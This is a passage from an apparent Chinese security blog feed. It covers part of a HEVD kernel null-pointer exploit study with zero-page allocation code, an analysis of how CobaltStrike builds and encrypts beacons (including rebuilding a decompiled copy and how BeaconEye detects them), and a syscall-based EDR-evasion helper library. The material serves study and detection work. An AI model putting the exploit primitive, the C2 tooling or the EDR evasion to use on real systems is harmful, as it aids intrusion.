class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">BOOL </span>AllocateZeroPage()</div><div class="line">&#123;</div><div class="line">pfnNtAllocateVirtualMemory NtAllocateVirtualMemory = (pfnNtAllocateVirtualMemory)GetProcAddress(GetModuleHandle(<span class="string">"ntdll.dll"</span>),</div><div class="line"><span class="string">"NtAllocateVirtualMemory"</span>)<span class="comment">;</span></div><div class="line">if (NULL == NtAllocateVirtualMemory)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[!] Get NtAllocateVirtualMemory Error\n"</span>)<span class="comment">;</span></div><div class="line">return FALSE<span class="comment">;</span></div><div class="line">&#125;</div><div class="line">printf(<span class="string">"[*] NtAllocateVirtualMemory Address is :0x%p \n"</span>, NtAllocateVirtualMemory)<span class="comment">;</span></div><div class="line">NTSTATUS ntStatus = <span class="number">0</span><span class="comment">;</span></div><div class="line">PVOID <span class="keyword">BaseAddress </span>= (PVOID)<span class="number">0x00000001</span><span class="comment">;</span></div><div class="line">SIZE_T RegionSize = <span class="number">0x1000</span><span class="comment">;</span></div><div class="line">ntStatus = NtAllocateVirtualMemory((HANDLE)<span class="number">0xFFFFFFFF</span>,</div><div class="line">&amp;<span class="keyword">BaseAddress,</span></div><div class="line"><span class="keyword"></span><span class="number">0</span>,</div><div class="line">&amp;RegionSize,</div><div class="line">MEM_RESERVE <span class="title">| MEM_COMMIT |</span> MEM_TOP_DOWN,</div><div class="line">PAGE_EXECUTE_READWRITE)<span class="comment">;</span></div><div class="line">if (ntStatus != <span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[!]Execuate NtAllocateVirtualMemory Error\n"</span>)<span class="comment">;</span></div><div class="line">return FALSE<span class="comment">;</span></div><div class="line">&#125;</div><div class="line">return TRUE<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我在学习这段代码的时候，有个困惑就是为什么传入的BaseAddress值为什么是<code>(PVOID)0x00000001</code>,然后我看了<a href="http://blog.nsfocus.net/null-pointer-vulnerability-defense/" target="_blank" rel="external">空指针漏洞防护技术 提高篇</a>为我解答了疑惑，当BaseAddress为<code>0</code>的时候，并不能在零页内存中开辟空间，将AllocateType设置为MEM_TOP_DOWN，表示自上而下的分配内存，然后当BaseAddress设置为一个低地址，例如<code>1</code>,同时指定分配内存的大小大于这个值,例如<code>0x1000</code>,这样就可以申请到的内存包含了零页内存。</p><h2 id="0x5-3-参考"><a href="#0x5-3-参考" class="headerlink" title="0x5.3 参考"></a>0x5.3 参考</h2><ul><li><a href="https://bbs.pediy.com/thread-270198.htm" target="_blank" rel="external">HEVD学习笔记之空指针引用</a></li><li><a href="https://bbs.pediy.com/thread-252776.htm" target="_blank" rel="external">Windows Kernel Exploit 内核漏洞学习(5)-空指针解引用 </a></li><li><a href="http://blog.nsfocus.net/null-pointer-vulnerability-analysis-defense/" target="_blank" rel="external">空指针漏洞防护技术-初级篇</a></li><li><a href="http://blog.nsfocus.net/null-pointer-vulnerability-defense/" target="_blank" rel="external">空指针漏洞防护技术 提高篇</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;HEVD简单学习
    
    </summary>
    
      <category term="漏洞分析" scheme="https://findream.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
  </entry>
  
  <entry>
    <title>CobaltStrike Beacon生成原理分析</title>
    <link href="https://findream.github.io/2022/06/26/CobaltStrike%20Beacon%E7%94%9F%E6%88%90%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"/>
    <id>https://findream.github.io/2022/06/26/CobaltStrike Beacon生成原理分析/</id>
    <published>2022-06-26T06:02:11.000Z</published>
    <updated>2022-08-18T11:04:46.440Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言与背景"><a href="#0x00-前言与背景" class="headerlink" title="0x00 前言与背景"></a>0x00 前言与背景</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本文没有什么创新，只是在学习beacon生成和调试分析和检测beacon的过程中的一些记录。本文首发于跳跳糖安全社区(<a href="https://tttang.com/archive/1631/" target="_blank" rel="external">https://tttang.com/archive/1631/</a>)</p><a id="more"></a><h2 id="0x01-二次开发CobaltStrike"><a href="#0x01-二次开发CobaltStrike" class="headerlink" title="0x01 二次开发CobaltStrike"></a>0x01 二次开发CobaltStrike</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我这是在网上找到的一个由鸡哥反编译的一个CobaltStrike4.1版本，所以不在需要重新反编译了。如下是工作目录。<code>decomplie_src</code>是存储着CS反编译的代码，<code>lib目录</code>存储着cobaltstrike4.1.jar文件，作为库文件。<code>out</code>作为编译输出的目录，<code>src</code>存放着所需要的源码文件，也就是<code>decomplie_src</code>源码的子集。这里需要使用的工具是IDEA。<br>    <img src="http://hacky.wang/blog/20220624/JlMIrVX7WosS.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先新建一个项目，设置好项目名和路径之后，在Project下面新建两个目录，<code>decomplie_src</code>和<code>lib</code>目录。<br>    <img src="http://hacky.wang/blog/20220624/180Hr5HH5CL2.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220624/MW2SFwlDHsvD.png?imageslim" alt="mark"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;把反编译之后的decomplie_src目录里面的所有java文件复制到项目中的<code>decomplie_src</code>,并把cobaltstrike4.1.jar文件放到项目中的<code>lib</code>目录。<br>    <img src="http://hacky.wang/blog/20220624/u5icDjw78qF9.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对项目进行设置，添加模块依赖，在路径<code>File--&gt;Project Structure--&gt;Modules--&gt;Dependencies</code>设置SDK。然后在Dependencies这个页面点一下”+”号，添加jar包，完成后点应用。<br>    <img src="http://hacky.wang/blog/20220624/MlCs7zXcxrgt.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220624/Njln99Ifj5R0.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;进入<code>Artifacts--&gt;JAR--&gt;From modules with dependencies</code>,设置一个MAIN CLASS为<code>aggressor.Aggressor</code>,这个值可以在<code>MANIFEST.MF</code>文件中查看。完成之后就是这样的结果。<br>    <img src="http://hacky.wang/blog/20220624/J5byFdOSvIlw.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220624/o8DxDDIsJRol.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后就是将<code>decomplie_src</code>复制到<code>src</code>中，这里直接将网上编译的那个版本的src目录复制到本项目的<code>src</code>目录中，如果有其他需求可以自己从<code>decomplie_src</code>复制添加即可。<br>    <img src="http://hacky.wang/blog/20220624/KQNB44PIg1kw.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>Build --&gt;Build Artifacts --&gt;Build</code>进行编译。在out目录就可以看到生成的.jar文件。<br>    <img src="http://hacky.wang/blog/20220624/KNJt0CWWtRNk.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>Run --&gt; Profile--&gt;Edit...</code>编辑配置，选择“+”号，在JAR Application添加一个配置文件。在<code>Path to jar</code>选择编译生成的jar包路径。在<code>VM Optionals</code>填入<code>-XX:+AggressiveHeap -XX:+UseParallelGC</code><br>    <img src="http://hacky.wang/blog/20220624/pRronaNRd0QF.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以后每次要运行或者调试的时候，都可以<code>Run--&gt;Profile--&gt;Run(debug)</code><br>    <img src="http://hacky.wang/blog/20220624/Pr7DFcptxIjA.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后就完成了。<br>    <img src="http://hacky.wang/blog/20220624/LhpRo180mPGe.png?imageslim" alt="mark"></p><h2 id="0x02-beacon生成原理"><a href="#0x02-beacon生成原理" class="headerlink" title="0x02 beacon生成原理"></a>0x02 beacon生成原理</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;beacon生成主要有3个步骤，首先是将C2Patch的相关数据patch到beacon中，便于beacon使用，第二步，处理beacon的PE数据和添加引导shellcode，这段shellcode是引导执行ReflectiveLoader。第三步将beacon加密，并和一些数据patch到loader中。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在beacon生成这块，主要涉及到4个java文件。BeaconPayload.java主要是对beacon进行C2Profile相关的处理，主要涉及的函数为<code>exportBeaconStage</code>。MalleablePE.java，主要用于对beacon进行一些PE相关的处理，主要涉及的函数为<code>process</code>函数。而BeaconLoader.java主要是patch beacon的开头那段shellcode。主要涉及到<code>patchDOSHeader</code>函数。BaseArtifactUtils主要是将加密beacon数据和一些加密beacon的key之类的数据patch到loader模板上，</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CobaltStrike服务端，通过()生成beacon，经过分析，将断点分别下在<code>WindowsExecutableStageDialog.dialogAction</code>和<code>WindowsExecutableStageDialog.dialogResult</code>这两个函数处。通过 dialogAction函数，选择需要保存的文件的内容或者格式。然后调用<code>SafeDialogs.saveFile</code>函数，弹出保存文件的选择框。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着调用<code>dialogResult</code>函数，dialogResult函数是生成beacon的主要流程，参数的参数var1表示保存beacon的路径。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;依次获取架构类型(x86或者x64)，然后监听器这里选的是reverse_http。<br>    <img src="http://hacky.wang/blog/20220623/QSe5gp6RBP5h.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后调用<code>ScListener.export</code>函数,export函数的作用是通过不同的监听器，选择不同的Stage。本例中是调用eaconPayload.exportBeaconStageHTTP函数。exportBeaconStageHTTP的参数分别是(var1)端口，(var2)链接地址，var3，var4分别是false，var5是架构。通过不同的架构选择不同的BeaconStage数据。<br>    <img src="http://hacky.wang/blog/20220623/rJjcOad9snpb.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/7INX6IdrJkKe.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>exportBeaconStage</code>函数中，首先调用<code>SleevedResource.readResource</code>加载指定的beacon原始文件<br>    <img src="http://hacky.wang/blog/20220623/C48efyX0dfK6.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后读取C2Profile中的uri等C2Profile信息。我曾经根据这些默认的C2Profile的URI信息，捞到过一批有价值的CobaltStrike样本。<br>    <img src="http://hacky.wang/blog/20220623/D83MeRV78tAw.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/A4UuK5aWOAXl.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在解析完C2Profile数据之后，就会按照一定的顺序将这些C2Profile的参数拼装起来，并patch到beacon中，以供beacon使用。<br>    <img src="http://hacky.wang/blog/20220623/bu0YQ14ummLY.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/uYJiQEmLmNSl.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>beacon\BeaconConstants.java</code>这个文件中，可以看到C2Profile数据拼接序号的含义。在之前分析exportBeaconStageHTTP参数的时候，var1为端口。可以看到这里第二个处理的就是端口。而<code>beacon\BeaconConstants.java</code>文件的第二项的内容也是端口。<br>    <img src="http://hacky.wang/blog/20220623/NTpTzsELKAWb.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/YQ1tnjtbB2AN.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;拼接C2Profile数据的是和，CobaltStrike使用<code>addShort</code>,<code>addInt</code>,<code>addData</code>,<code>addString</code>四个函数添加数据。其中前三个为基本函数，<code>addString</code>底层是通过<code>addData</code>实现的。以addData为例子，通过分析参数，可知依次添加了index，type，length，和value。且如果是short类型，type为1，如果是int类型，type为2，如果是Data或者string类型呢，type就为3了。<br>    <img src="http://hacky.wang/blog/20220623/S9zasGjerEo7.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/AdwyrgXHhL1Y.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/KERO9tQq3u5y.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后将这些数据转化为byte类型，然后将其与46进行进行异或运算。<br>    <img src="http://hacky.wang/blog/20220623/pxWGVGjqc0x1.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将读取的原始beacon文件的byte转化为string类型，并定位其中的“AAAABBBBCCCCDDDDEEEEFFFF”字符串。然后用C2Profile数据替换掉。<br>    <img src="http://hacky.wang/blog/20220623/q9NJ8sBWPW3i.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当C2Profile的数据patch到beacon之后呢，开始处理PE数据，CobaltStrike在处理PE数据的时候分为两部，首先会对PE数据进行预处理，也就是从C2Profile中读取关于PE处理的相关数据，例如image_size，compile_time等等，然后对这些PE的基础数据进行处理。<br>    <img src="http://hacky.wang/blog/20220623/qCRTUnlNqiKV.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在对PE数据进行预处理之后呢，根据所选择的架构不同，patch DOS头，也就是前面那段shellcode。首先调用findReflectiveLoader函数，通过导出表获取<code>ReflectiveLoader</code>导出函数地址。然后将该地址填充到shellcode中，其实分析过这种stage类型的beacon会发现，这种payload本质就是一个PE文件，只不过PE头被修改成一段可以执行的shellcode，这个shellcode的目的就是引导至ReflectiveLoader函数。<br>    <img src="http://hacky.wang/blog/20220623/obL6hTFYlzJB.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;构造合适的Loader,在<code>_patchArtifact</code>函数中，首先读取指定的Loader的模板，该模板位于resources/目录下面，然后生成一组随机的byte数组，并用这些数组对beacon进行异或加密，这也是为什么每个生成的beacon都是不一样的原因。<br>    <img src="http://hacky.wang/blog/20220623/Gh1YbaAyjc8N.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后依次保存1024个A所在地址偏移+16这个地址，beacon的长度，异或加密的随机数组，GetModuleHandleA，GetProcAddress函数地址(如果可以的话)，保存加密之后的beacon数据，将上述数据替换到那1024个A处。然后将byte[]写入指定文件即完成beacon的生成。<br>    <img src="http://hacky.wang/blog/20220623/cs0HIULgMsED.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/4ouN66Vuhwxy.png?imageslim" alt="mark"></p><h2 id="0x03-beacon分析调试"><a href="#0x03-beacon分析调试" class="headerlink" title="0x03 beacon分析调试"></a>0x03 beacon分析调试</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据上面分析，cobalt strike 的stage模式从loader通过CreateThread执行beacon。经过一小段shellcode之后，执行<code>ReflectiveLoader</code>，在<code>ReflectiveLoader</code>处理完PE数据之后，其实是跳转到了DllEntryPoint函数。此处将重点分析beacon对于C2Profile的解析过程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很显然，在beacon中，第一个函数的作用是定位当前EIP,第二个函数即就是<code>ReflectiveLoader</code>,经过对PE的一些处理之后，最后会执行<code>DllEntryPoint</code>.<br>    <img src="http://hacky.wang/blog/20220623/kxXhOy4zXodd.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/tblBaWchlHIo.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在dwReason为1的时候初始化C2Profile数据，在<code>Sub_339762_Parse_C2Profile</code>函数中，很显然，可以看到将C2Profile进行了解密。在内存中，大概还是以 index，type，length，value的顺序进行分布。<br>    <img src="http://hacky.wang/blog/20220623/Co980Xfz8Qft.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/E6oG4a0EWkvk.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后读取整个解密数据，解析出type和value，只将这两项目保存到刚刚malloc的内存中。并且将type和value从偏移为8的地址处开始保存。而这一部分数据的分布顺序就是一些检测工具，例如BeaconEye的检测原理。<br>    <img src="http://hacky.wang/blog/20220623/AMvYidsfiWhw.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/3ezQKal3H90V.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其实，往下面翻一番是能找到所链接的server的。<br>    <img src="http://hacky.wang/blog/20220623/P22QPaHCPWFk.png?imageslim" alt="mark"></p><h2 id="0x04-BeaconEye原理分析"><a href="#0x04-BeaconEye原理分析" class="headerlink" title="0x04 BeaconEye原理分析"></a>0x04 BeaconEye原理分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BeaconEye使用C#开发，通过使用yara规则，检测beacon解析之后的C2Profile数据分布实现的。因为libyaraNET库没有x86版本，所以BeaconEye务必编译成X64版本，才可以通过。<br>    <img src="http://hacky.wang/blog/20220623/aa4p8A9xCnKh.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以x86的yara规则举例子，yara第一段为全0，因为C2Profile数据是从+0x08处开始复制的，所以前八个字节没有数据为全0，剩下的数据就很简单了，根据解析C2Profile的变量类型来看，前六个数据类型分别是short，short，int，int，short，short对应的type分别是01，01,02,02,01,01。这样就是检测的原理。<br>    <img src="http://hacky.wang/blog/20220623/ULBCsrwcULaa.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/SXcP7yx4SrxN.png?imageslim" alt="mark"></p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><ul><li><a href="https://blog.51cto.com/u_15274949/2931535" target="_blank" rel="external">CobaltStrike二次开发环境初探</a></li><li><a href="https://xz.aliyun.com/t/10784" target="_blank" rel="external">CobaltStrike逆向学习系列(2)：Stageless Beacon 生成流程分析</a></li><li><a href="https://xz.aliyun.com/t/10785" target="_blank" rel="external">CobaltStrike逆向学习系列(3)：Beacon C2Profile 解析</a></li><li><a href="https://xz.aliyun.com/t/10832" target="_blank" rel="external">CobaltStrike逆向学习系列(5)：Bypass BeaconEye</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言与背景&quot;&gt;&lt;a href=&quot;#0x00-前言与背景&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言与背景&quot;&gt;&lt;/a&gt;0x00 前言与背景&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;本文没有什么创新，只是在学习beacon生成和调试分析和检测beacon的过程中的一些记录。本文首发于跳跳糖安全社区(&lt;a href=&quot;https://tttang.com/archive/1631/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://tttang.com/archive/1631/&lt;/a&gt;)&lt;/p&gt;
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>SysWhispers2Demo 简介</title>
    <link href="https://findream.github.io/2022/06/25/SysWhispers2Demo/"/>
    <id>https://findream.github.io/2022/06/25/SysWhispers2Demo/</id>
    <published>2022-06-25T06:02:11.000Z</published>
    <updated>2022-06-25T14:32:29.489Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-项目简介"><a href="#0x00-项目简介" class="headerlink" title="0x00 项目简介"></a>0x00 项目简介</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SysWhispers2Demo是通过逆向分析kernel32.dll或者kernelbase.dll文件，从而仿写部分Win32 API的实现逻辑，以解决部分SysWhispers2使用者在利用SysWhispers2做EDR规避时候所遇到的开发困难。SysWhispers2Demo在仿写Win32 API的时候，<strong>部分采用最小开发原则</strong>，即部分参数需要使用微软API文档所约定的默认参数，以减轻仿写的工作量。项目地址:<a href="https://github.com/findream/SysWhispers2Demo" target="_blank" rel="external">https://github.com/findream/SysWhispers2Demo</a></p><a id="more"></a><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://github.com/jthuraisamy/SysWhispers2" target="_blank" rel="external">SysWhispers2</a>主要是由jthuraisamy开发的通过Syscall用来规避EDR。SysWhispers2使用很方便，无需指定windows 操作系统版本，只需要通过syswhispers.py生成Nt*函数所需要的函数参数，调用约定等。但是，Ring3的逻辑需要自己实现，这就是SysWhispers2Demo的目的。</p><h2 id="0x01-文件描述"><a href="#0x01-文件描述" class="headerlink" title="0x01 文件描述"></a>0x01 文件描述</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SysWhispers2Demo主要有3个文件<code>SysWhispers2Demo.cpp</code>,<code>SysWhispers2Demo.h</code>,<code>prototypes.h</code>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SysWhispers2Demo.cpp文件是Ring3层的实现逻辑。目前，主要实现了包括文件操作，注册表操作，进程操作，以及线程操作。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 文件操作，基本实现了文件的创建，读写，删除等操作，具体支持的Win32 API如下：<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">CreateFileA</span></div><div class="line"><span class="attribute">CreateFileW</span></div><div class="line"><span class="attribute">ReadFile</span></div><div class="line"><span class="attribute">WriteFile</span></div><div class="line"><span class="attribute">NtQueryInformationFile</span></div><div class="line"><span class="attribute">NtSetInformationFile</span></div><div class="line"><span class="attribute">NtOpenFile</span></div><div class="line"><span class="attribute">NtQueryDirectoryFile</span></div><div class="line"><span class="attribute">DeleteFileA</span></div><div class="line"><span class="attribute">DeleteFileW</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 注册表操作，也实现了注册表使用的常见API函数,支持两种ANSI和UNICODE字符。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">RegCreateKeyExA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegCreateKeyA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegSetValueExA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegDeleteValueA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegQueryValueExA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegOpenKeyExA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegOpenKeyA</span><span class="params">(W)</span></span></div><div class="line">RegCloseKey</div><div class="line"><span class="function"><span class="title">RegQueryInfoKeyA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegEnumKeyExA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegEnumKeyA</span><span class="params">(W)</span></span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 进程操作，也实现了常见的进程使用的API函数。<strong><em>因为CreateProcess内部实现的过于复杂，目前仅仅实现了能创建进程，但是创建进程之后，需要传出的参数，如ProcessInformation没有实现</em></strong><br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">CreateProcessA</span><span class="params">(W)</span></span></div><div class="line">WinExec</div><div class="line">OpenProcess</div><div class="line">TerminateProcess</div><div class="line">ReadProcessMemory</div><div class="line">WriteProcessMemory</div><div class="line">GetExitCodeProcess</div><div class="line">GetLogicalProcessorInformation</div><div class="line">GetProcessAffinityMask</div><div class="line">IsWow64Process</div><div class="line">GetProcessId</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;线程操作，也实现了常见的线程使用的API函数。<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">CreateThread</span></div><div class="line"><span class="attribute">CreateRemoteThreadEx</span></div><div class="line"><span class="attribute">ResumeThread</span></div><div class="line"><span class="attribute">OpenThread</span></div><div class="line"><span class="attribute">GetThreadContext</span></div><div class="line"><span class="attribute">GetExitCodeThread</span></div><div class="line"><span class="attribute">GetProcessIdOfThread</span></div><div class="line"><span class="attribute">TerminateThread</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SysWhispers2Demo.h是头文件，包含了SysWhispers2Demo.cpp的函数声明，和库所需要Nt*函数指针。前面typedef包含的是函数指针，后面是函数声明。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了增强开发的方便程度，SysWhispers2Demo采用的是和win32 API同样的函数原型，使用SysWhispers2Demo就像使用原生的Win32一模一样。仅仅需要在你所需要的Win32 API名称后面加一个Stub以示区别，例如，假如需要使用NtCreateFile创建文件，那么在Ring3需要调用CreateFileA，那只需要调用SysWhispers2Demo内置的CreateFileA_Stub。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;prototypes.h包含的是一些所需要的变量类型等数据。这个是我删除了ntdll.h文件的函数声明。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面三个文件，在使用的时候，需要导入新项目。除此以外，还有两个文件，ntdll.h存储了一些函数声明和遍历类型，使用者可以在这里查看函数原型。而main.cpp我写的部分测试用例，是关于部分Win32 API的使用。<strong>这两个文件不需要导入项目。</strong></p><h2 id="0x02-使用步骤"><a href="#0x02-使用步骤" class="headerlink" title="0x02 使用步骤"></a>0x02 使用步骤</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SysWhispers2Demo仅仅支持x64，x86在Syscall会遇到莫名其妙的问题，可以解决，但是不具有通用性，暂时不考虑支持x86。在win10 x64 